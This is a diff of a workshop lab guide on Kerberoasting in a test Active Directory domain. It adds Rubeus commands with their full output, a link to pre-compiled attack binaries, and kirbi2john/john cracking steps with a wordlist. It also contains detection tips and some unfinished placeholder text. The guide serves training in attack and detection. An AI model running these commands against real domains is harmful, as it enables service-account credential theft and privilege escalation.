@@ -36,11 +36,11 @@ At this point you should still be RDP'd to TWORIVERS from the attack machine. On
 
     ```powershell
     cd C:\Users\Public\Desktop\LAB_FILES\assets\
-    expand-archive ./Rubeus-1.6.4.zip
-    cd .\Rubeus-1.6.4\Rubeus-1.6.4\
+    expand-archive .\Rubeus-alt.zip
+    cd .\Rubeus-alt
     ```
 
-    As a note, [Rubeus is provided as source code](https://for528.com/rubeus). Some TAs will use [a well-known pre-compiled version in their attacks](https://for528.com/ghostpack-compiled), while others will compile the tool from source.
+    As a note, [Rubeus is provided as source code](https://for528.com/rubeus). Some TAs will use [a well-known pre-compiled version in their attacks](https://for528.com/ghostpack-compiled), while others will compile the tool from source. The `Rubeus-alt.zip` archive above is actually the pre-compiled version from [here](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/dotnet%20v4.5%20compiled%20binaries/Rubeus.exe).
 
 1. Perform a Kerberoasting attack using Rubeus:
     
@@ -50,19 +50,46 @@ At this point you should still be RDP'd to TWORIVERS from the attack machine. On
 
     Above we used the `/format:hashcat` option to tell Rubeus to output hashes in hashcat format. [The project's Roast.cs source file](https://github.com/GhostPack/Rubeus/blob/659d98d8582573c2ff8c3a68ee0b02d7d5f8387d/Rubeus/lib/Roast.cs#L207) accepts either `john` or `hashcat` as the output options. Many TAs like to use [haschat](https://for528.com/hashcat) because of its strong support for GPU cracking.
 
-!!!! RYAN FILL ME OUT WITH THE NEXT STEPS FOR CRACKING SON !!!!
-!!!! RYAN FILL ME OUT WITH THE NEXT STEPS FOR CRACKING SON !!!!
+    Expected output:
+    
+    ```
+    ./rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Perflogs\hashes.txt
 
-### DANGER WILL ROBINSON
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
 
-WHOOPS!!! Need .NET Framework 3.5!
-WHOOPS!!! Need .NET Framework 3.5!
-WHOOPS!!! Need .NET Framework 3.5!
-WHOOPS!!! Need .NET Framework 3.5!
+      v2.2.0
 
-See https://github.com/arosenmund/defcon_31_ad_good_bad_lolWut/issues/8
 
-### DANGER WILL ROBINSON
+    [*] Action: Kerberoasting
+
+    [*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+    [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+    [*] Target Domain          : wheel.co
+    [*] Searching path 'LDAP://tarvalon.wheel.co/DC=wheel,DC=co' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'
+
+    [*] Total kerberoastable users : 1
+
+
+    [*] SamAccountName         : svc-file
+    [*] DistinguishedName      : CN=svc-file,CN=Users,DC=wheel,DC=co
+    [*] ServicePrincipalName   : HOST/shadarlogoth.wheel.co
+    [*] PwdLastSet             : 8/7/2023 2:08:41 AM
+    [*] Supported ETypes       : RC4_HMAC_DEFAULT
+    [*] Hash written to C:\Perflogs\hashes.txt
+
+    [*] Roasted hashes written to : C:\Perflogs\hashes.txt
+    PS C:\Users\Public\Desktop\LAB_FILES\assets\Rubeus-alt>
+    ```
+    
+    So far, so good! You now have a `hashes.txt` file at `C:\Perflogs\hashes.txt` that includes the kerberoastable hashes. Notice that we have identified that the `svc-file` account has a SPN of `HOST/shadarlogoth.wheel.co`. Also note that the encryption support is RC4, which is insecure and exactly what we want!
+
+    __Though we will not be covering the process in a step-by-step fashion, we will show you how these hashes could be cracked if we have time after the primary portions of our workshop have been completed.__
 
 ## Kerberoasting via Mimikatz
 
@@ -205,7 +232,7 @@ The Mimikatz code base uses a hardcoded file suffix of `.kirbi` when it saves ti
 This serves as a great example as to why being able to review source code can prove useful in generating your detection and mitigation methods! Given this finding, you should set up alerts for the creation of any file with a `.kirbi` extension.
 - Sure, threat actors _could_ compile their own versions of Mimikatz with custom file suffixes set, but this is not done commonly by TAs such as ransomware affiliates.
 
-## Cracking the Kirbi Files
+**Review the extracted kirbi files**
 
 1. Exit Mimikatz:
     
@@ -232,15 +259,20 @@ This serves as a great example as to why being able to review source code can pr
     -a----          8/7/2023   6:55 PM           1644 3-40a50000-Administrator@ldap~tarvalon.wheel.co~wheel.co-WHEEL.CO.kirbi
     ```
     
-### RYAN FINISH ME BUDDY!!
+Congrats! You've now dumped your in-memory tickets to disk. Your next step would be to crack the kirbi files.
 
-RYAN TO DOCUMENT WHAT WOULD HAPPEN NEXT!!!
-RYAN TO DOCUMENT WHAT WOULD HAPPEN NEXT!!!
+## BONUS: kirbi2john Cracking Method
 
-### RYAN FINISH ME BUDDY!!
+If you want to use `john` to do the cracking, you can do see using a method similar to the following:
 
 ```
 kirbi2john.py 2-40a10000-Administrator@HOST~DRAGONMOUNT.wheel.co-WHEEL.CO.kirbi > svc-file_krb5tgs.txt
 
 john --wordlist=./rockyou.txt svc-file_krb5tgs.txt
 ```
+
+Above we run [kirbi2john.py](https://github.com/nidem/kerberoast/blob/master/kirbi2john.py) to convert the kirbi files to a format that `john` can use. We then run `john` and provide an example wordlist (like the classic `rockyou.txt` password dump) along with our converted hashes file.
+
+## BONUS: tgsrepcrack.py Cracking Method
+
+Ryan will walk you through this process
